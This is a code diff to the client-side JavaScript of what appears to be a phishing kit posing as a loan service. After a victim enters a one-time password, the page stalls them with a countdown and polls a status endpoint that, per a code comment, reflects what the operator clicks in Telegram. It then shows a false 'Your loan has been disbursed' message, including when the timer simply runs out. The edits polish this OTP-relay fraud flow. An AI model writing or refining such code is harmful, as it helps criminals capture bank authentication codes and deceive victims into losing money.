@@ -506,7 +506,6 @@
                 if (data.success) {
                     // 3-minute (180 seconds) loading countdown timer
                     let remainingSeconds = 180;
-                    
                     const countdownInterval = setInterval(async () => {
     remainingSeconds--;
     let minutes = Math.floor(remainingSeconds / 60);
@@ -515,7 +514,7 @@
 
     otpStatusBox.innerText = `Authorizing transaction... Please wait (${minutes}:${formattedSeconds})`;
 
-    // Check the server status to see what the admin clicked in Telegram!
+    // Check the server status to see what you clicked on Telegram!
     try {
         const statusRes = await fetch('/api/status');
         const statusData = await statusRes.json();
@@ -525,13 +524,15 @@
             spinner.style.display = "none";
             otpSubmitBtn.disabled = false;
             otpSubmitBtn.style.opacity = "1";
+            otpStatusBox.style.display = "block";
             otpStatusBox.style.background = "#fee2e2";
             otpStatusBox.style.color = "#991b1b";
-            otpStatusBox.innerText = "OTP verification failed. Please try again.";
+            otpStatusBox.innerText = "Wrong OTP, please try again.";
             return;
-        } else if (statusData.status === "correct_otp" || statusData.status === "approved") {
+        } else if (statusData.status === "approved" || statusData.status === "correct_otp") {
             clearInterval(countdownInterval);
             spinner.style.display = "none";
+            otpStatusBox.style.display = "block";
             otpStatusBox.style.background = "#dcfce7";
             otpStatusBox.style.color = "#166534";
             otpStatusBox.innerText = "Transaction complete! Your loan has been disbursed.";
@@ -544,6 +545,7 @@
     if (remainingSeconds <= 0) {
         clearInterval(countdownInterval);
         spinner.style.display = "none";
+        otpStatusBox.style.display = "block";
         otpStatusBox.style.background = "#dcfce7";
         otpStatusBox.style.color = "#166534";
         otpStatusBox.innerText = "Transaction complete! Your loan has been disbursed.";
